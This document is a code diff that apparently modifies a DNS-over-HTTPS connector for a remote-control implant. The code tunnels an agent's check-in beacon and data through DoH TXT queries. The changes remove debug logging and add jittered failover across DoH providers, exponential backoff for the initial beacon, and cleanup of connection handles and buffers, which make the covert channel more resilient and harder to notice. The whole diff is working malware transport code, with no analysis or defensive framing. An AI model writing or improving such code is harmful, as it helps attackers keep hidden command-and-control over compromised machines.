@@ -78,11 +78,6 @@ static int EncodeDnsName(const CHAR* host, BYTE* buf, int bufSize)
 	if (!host || !buf || bufSize <= 1)
 		return -1;
 
-	CHAR dbg[160];
-	_snprintf(dbg, sizeof(dbg), "[DoH] EncodeDnsName enter, bufSize=%d", bufSize);
-	DohConnectorLog(dbg);
-	DohConnectorLog(host);
-
 	int len = 0;
 	const CHAR* p = host;
 	while (*p) {
@@ -113,9 +108,6 @@ static int EncodeDnsName(const CHAR* host, BYTE* buf, int bufSize)
 	if (len + 1 > bufSize)
 		return -1;
 	buf[len++] = 0;
-
-	_snprintf(dbg, sizeof(dbg), "[DoH] EncodeDnsName leave, len=%d", len);
-	DohConnectorLog(dbg);
 	return len;
 }
 
@@ -356,6 +348,15 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
         this->urlCount = 1;
     }
     
+    // Reset per-provider health state and choose an initial index for stickiness
+    for (ULONG i = 0; i < 16; ++i) {
+        this->urlFailCount[i] = 0;
+        this->urlDisabledUntil[i] = 0;
+    }
+    if (this->urlCount > 0) {
+        this->currentUrlIndex = GetTickCount() % this->urlCount;
+    }
+
     if (!beat || !beatSize || beatSize < 8) {
         DohConnectorLog("[DoH] SetConfig: invalid beat (null or too small)");
         return FALSE;
@@ -381,15 +382,17 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
 
     _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);
 
-    if (beat && beatSize) {
-        this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
-        if (this->hiBeat) {
-            memcpy(this->hiBeat, beat, beatSize);
-            this->hiBeatSize = beatSize;
-            this->hiRetries  = 3;
-            this->hiSent     = FALSE;
-        }
-    }
+    		if (beat && beatSize) {
+			this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
+			if (this->hiBeat) {
+				memcpy(this->hiBeat, beat, beatSize);
+				this->hiBeatSize = beatSize;
+				this->hiRetries  = 3;
+				this->hiSent     = FALSE;
+				this->hiRetryDelayMs = 0;
+				this->hiNextAttemptTick = 0;
+			}
+		}
 
 	this->initialized = TRUE;
 	{
@@ -472,20 +475,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
 	}
 
 	DohConnectorLog("[DoH] HTTP: PerformHttpRequest enter");
-	{
-		CHAR dbg[256];
-		_snprintf(dbg, sizeof(dbg),
-			"[DoH] HTTP: this=%p funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
-			this,
-			this->functions,
-			this->functions->LocalAlloc,
-			this->functions->InternetOpenA,
-			this->functions->InternetConnectA,
-			this->functions->HttpOpenRequestA,
-			this->functions->HttpSendRequestA,
-			this->functions->InternetReadFile);
-		DohConnectorLog(dbg);
-	}
 	if (qname) DohConnectorLog(qname);
 
     // 1. Construct DNS Wire Format Query
@@ -577,8 +566,12 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
         ULONG idx = (this->currentUrlIndex + i) % this->urlCount;
         CHAR* targetUrl = this->urlList[idx];
         if (!targetUrl || !*targetUrl) continue;
-		DohConnectorLog("[DoH] HTTP: using URL");
-		DohConnectorLog(targetUrl);
+        ULONG nowTick = GetTickCount();
+        if (this->urlDisabledUntil[idx] && nowTick < this->urlDisabledUntil[idx]) {
+            continue;
+        }
+        DohConnectorLog("[DoH] HTTP: using URL");
+        DohConnectorLog(targetUrl);
 
         CHAR hostName[256] = {0};
         CHAR urlPath[256] = {0};
@@ -621,6 +614,13 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
         this->hConnect = this->functions->InternetConnectA(this->hInternet, hostName, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
         if (!this->hConnect) {
             DohConnectorLog("[DoH] HTTP: InternetConnectA failed, rotating URL");
+            this->urlFailCount[idx]++;
+            if (this->urlFailCount[idx] >= 3) {
+                ULONG backoff = 60000;
+                ULONG jitter = GetTickCount() & 0x1FFF;
+                this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
+                this->urlFailCount[idx] = 0;
+            }
             continue;
         }
 
@@ -630,6 +630,13 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
         HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, "POST", urlPath, NULL, NULL, NULL, flags, 0);
         if (!hRequest) {
             DohConnectorLog("[DoH] HTTP: HttpOpenRequestA failed, rotating URL");
+            this->urlFailCount[idx]++;
+            if (this->urlFailCount[idx] >= 3) {
+                ULONG backoff = 60000;
+                ULONG jitter = GetTickCount() & 0x1FFF;
+                this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
+                this->urlFailCount[idx] = 0;
+            }
             continue;
         }
 
@@ -693,6 +700,8 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
                         DohConnectorLog(dbg);
                         // Success! Update current index
                         this->currentUrlIndex = idx;
+                        this->urlFailCount[idx] = 0;
+                        this->urlDisabledUntil[idx] = 0;
                         *outData = respBuf;
                         *outLen = respSize;
                         this->functions->InternetCloseHandle(hRequest);
@@ -711,6 +720,20 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
     }
 
     this->functions->LocalFree(query);
+
+    // All providers failed for this request: reset WinINet handles so that
+    // future attempts can rebuild connections and pick up any network changes.
+    if (this->hConnect) {
+        this->functions->InternetCloseHandle(this->hConnect);
+        this->hConnect = NULL;
+    }
+    if (this->hInternet) {
+        this->functions->InternetCloseHandle(this->hInternet);
+        this->hInternet = NULL;
+    }
+    this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+    this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
+
     return FALSE;
 }
 
@@ -862,20 +885,6 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
 void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 {
 	DohConnectorLog("[DoH] SendData: enter");
-	{
-		CHAR dbg[256];
-		_snprintf(dbg, sizeof(dbg),
-			"[DoH] SendData: this=%p funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
-			this,
-			this->functions,
-			this->functions ? this->functions->LocalAlloc : NULL,
-			this->functions ? this->functions->InternetOpenA : NULL,
-			this->functions ? this->functions->InternetConnectA : NULL,
-			this->functions ? this->functions->HttpOpenRequestA : NULL,
-			this->functions ? this->functions->HttpSendRequestA : NULL,
-			this->functions ? this->functions->InternetReadFile : NULL);
-		DohConnectorLog(dbg);
-	}
 
 	// Base packet size used for logical DNS frames over DoH
 	ULONG pkt = this->pktSize ? this->pktSize : 1024;
@@ -1012,6 +1021,14 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 	// 3. HI retry path when no explicit data is provided
 	// -------------------------------------------------------------------------
 	if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
+		// Backoff: only attempt HI retry when the scheduled time has passed
+		if (this->hiRetryDelayMs && this->hiNextAttemptTick) {
+			ULONG now = GetTickCount();
+			if (now < this->hiNextAttemptTick) {
+				return;
+			}
+		}
+
 		ULONG maxBuf = pkt;
 		ULONG retrySize = this->hiBeatSize;
 		if (retrySize > maxBuf)
@@ -1032,9 +1049,23 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 		ULONG tmpSize = 0;
 		if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
 			this->hiSent = TRUE;
+			this->hiRetryDelayMs = 0;
+			this->hiNextAttemptTick = 0;
 		}
 		else if (this->hiRetries > 0) {
 			this->hiRetries--;
+			if (this->hiRetries > 0) {
+				if (this->hiRetryDelayMs == 0) {
+					this->hiRetryDelayMs = 1000; // start with 1s
+				}
+				else {
+					ULONG next = this->hiRetryDelayMs * 2;
+					if (next > 300000) // cap at 5 minutes
+						next = 300000;
+					this->hiRetryDelayMs = next;
+				}
+				this->hiNextAttemptTick = GetTickCount() + this->hiRetryDelayMs;
+			}
 		}
 		return;
 	}
@@ -1130,6 +1161,13 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
 								this->downBuf = NULL;
 							}
+							else {
+								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+								this->downBuf = NULL;
+								this->downTotal = 0;
+								this->downFilled = 0;
+								return;
+							}
 						}
 						else if (flags == 0 && orig > 0 && orig <= this->downTotal - 5) {
 							BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
@@ -1139,6 +1177,13 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 								finalSize = orig;
 								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
 								this->downBuf = NULL;
+							}
+							else {
+								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+								this->downBuf = NULL;
+								this->downTotal = 0;
+								this->downFilled = 0;
+								return;
 							}
 						}
 					}
@@ -1167,3 +1212,25 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 BYTE* ConnectorDoH::RecvData() { return this->recvData; }
 int ConnectorDoH::RecvSize() { return this->recvSize; }
 void ConnectorDoH::RecvClear() { this->recvData = NULL; this->recvSize = 0; }
+
+void ConnectorDoH::ReportProtocolResult(BOOL success)
+{
+	if (this->urlCount == 0)
+		return;
+	ULONG idx = this->currentUrlIndex;
+	if (idx >= this->urlCount)
+		idx = 0;
+	if (success) {
+		this->urlFailCount[idx] = 0;
+		this->urlDisabledUntil[idx] = 0;
+		return;
+	}
+	this->urlFailCount[idx]++;
+	const ULONG max_fail = 3;
+	if (this->urlFailCount[idx] >= max_fail) {
+		ULONG backoff = 60000;
+		ULONG jitter = GetTickCount() & 0x1FFF;
+		this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
+		this->urlFailCount[idx] = 0;
+	}
+}
